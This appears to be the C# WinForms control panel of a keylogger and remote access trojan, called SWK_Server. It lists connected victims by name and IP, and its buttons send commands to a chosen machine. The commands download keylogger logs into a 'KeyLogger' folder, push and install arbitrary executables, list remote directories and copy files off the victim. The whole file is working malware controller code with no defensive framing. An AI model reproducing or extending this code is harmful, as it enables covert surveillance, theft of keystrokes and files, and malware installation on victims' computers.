using System;
using System.Windows.Forms;
using System.Drawing;
using System.IO;
using static SWK_Server.ApplicationData;
using System.Threading;

namespace SWK_Server
{
    public partial class MainForm : Form
    {
        public User user { get; set; }

        public MainForm()
        {
            InitializeComponent();
            Init();
        }

        private void button_StartServer_Click(object sender, EventArgs e)
        {
            server = new Server(textBox_Ip.Text, int.Parse(textBox_Port.Text));

            label_Status.Text = "STATUS: Active";
            label_Status.ForeColor = Color.Chartreuse;

            InitDataGridUsers();
        }

        private void button_Close_Click(object sender, EventArgs e)
        {
            #pragma warning disable CS0618
            server.ServerProcess.Suspend();
            server.Listener.Stop();

            label_Status.Text = "STATUS: Disabled";
            label_Status.ForeColor = Color.Red;
        }

        private void Init()
        {
            
        }

        private void InitDataGridUsers()
        {
            typeof(Control).GetProperty("DoubleBuffered", System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Instance | System.Reflection.BindingFlags.SetProperty).SetValue(dataGridView_Users, true, null);
            Application.Idle += delegate { dataGridView_Users.RowCount = server.Users.Count; dataGridView_Users.Invalidate(); };
        }

        private void dataGridView_Users_CellValueNeeded(object sender, DataGridViewCellValueEventArgs e)
        {
            if (e.RowIndex < 0 || e.RowIndex >= server.Users.Count) return;
            switch (e.ColumnIndex)
            {
                case 0: e.Value = server.Users[e.RowIndex].UserName; break;
                case 1: e.Value = server.Users[e.RowIndex].Ip; break;
            }
        }

        private void dataGridView_Users_CellClick(object sender, DataGridViewCellEventArgs e)
        {
            if (e.RowIndex >= 0)
            {
                user = server.Users[e.RowIndex];
                label_SelectedUser.Text = "USER: " + user.UserName;
            }
        }

        private void button_Active_Click(object sender, EventArgs e)
        {
            textBox_Response.Text = Crypto.BytesToString(server.SendDataUser(user, Crypto.StringToBytes("/Enabled true")));
        }

        private void button_Disable_Click(object sender, EventArgs e)
        {
            textBox_Response.Text = Crypto.BytesToString(server.SendDataUser(user, Crypto.StringToBytes("/Enabled false")));
        }

        private void button_DownLog_Click(object sender, EventArgs e)
        {
            byte[] Log = server.SendDataUser(user, Crypto.StringToBytes("/DownLog"));
            string KeyLogsPath = user.Path + @"\KeyLogger";

            if (!File.Exists(KeyLogsPath))
                Directory.CreateDirectory(KeyLogsPath);

            string NowDayLogsPath = KeyLogsPath + @"\" + DateTime.Now.ToString("dd.MM.yyyy");

            if (!File.Exists(NowDayLogsPath))
                Directory.CreateDirectory(NowDayLogsPath);

            string LogPath = NowDayLogsPath + @"\" + DateTime.Now.ToString("ss.mm.HH") + ".txt";

            File.WriteAllBytes(LogPath, Log);
        }

        private void button_InstallExe_Click(object sender, EventArgs e)
        {
            string FilePath = string.Empty;

            OpenFileDialog of = new OpenFileDialog();
            if (of.ShowDialog() == DialogResult.OK)
            {
                FilePath = of.FileName;
            }

            textBox_Response.Text = Crypto.BytesToString(server.SendDataUser(user, Crypto.StringToBytes($"/InstallExe \"{textBox_Path.Text}\"")));
            server.SendDataUser(user, File.ReadAllBytes(FilePath));
        }

        private void button_Exists_Click(object sender, EventArgs e)
        {
            textBox_Response.Text = Crypto.BytesToString(server.SendDataUser(user, Crypto.StringToBytes($"/Exists \"{textBox_Path.Text}\"")));
        }

        private void button_InDirectory_Click(object sender, EventArgs e)
        {
            textBox_Response.Text = Crypto.BytesToString(server.SendDataUser(user, Crypto.StringToBytes($"/FilesInDirectory \"{textBox_Path.Text}\"")));
        }

        private void button_InDirectoryInfo_Click(object sender, EventArgs e)
        {
            textBox_Response.Text = Crypto.BytesToString(server.SendDataUser(user, Crypto.StringToBytes($"/FilesInDirectory \"{textBox_Path.Text}\" -info")));
        }

        private void button_DownloadFile_Click(object sender, EventArgs e)
        {
            byte[] file = server.SendDataUser(user, Crypto.StringToBytes($"/DownloadFile \"{textBox_Path.Text}\""));

            string UserDownloadsPath = user.Path + @"\Downloads";

            if (!File.Exists(UserDownloadsPath))
                Directory.CreateDirectory(UserDownloadsPath);

            string filePath = UserDownloadsPath + @"\" + textBox_FileName.Text;

            File.Create(filePath);
            File.WriteAllBytes(filePath, file);
        }

        private void button_Copy_Click(object sender, EventArgs e)
        {
            Clipboard.SetText(textBox_Response.Text);
        }

        private void button_Clear_Click(object sender, EventArgs e)
        {
            textBox_Response.Text = string.Empty;
        }

        private void button_Save_Click(object sender, EventArgs e)
        {
            if (SaveFileDialog.ShowDialog() == DialogResult.OK)
            {
                string FileName = SaveFileDialog.FileName;
                File.WriteAllText(FileName, textBox_Response.Text);
            }
        }

        private void MainForm_Load(object sender, EventArgs e)
        {

        }
    }
}
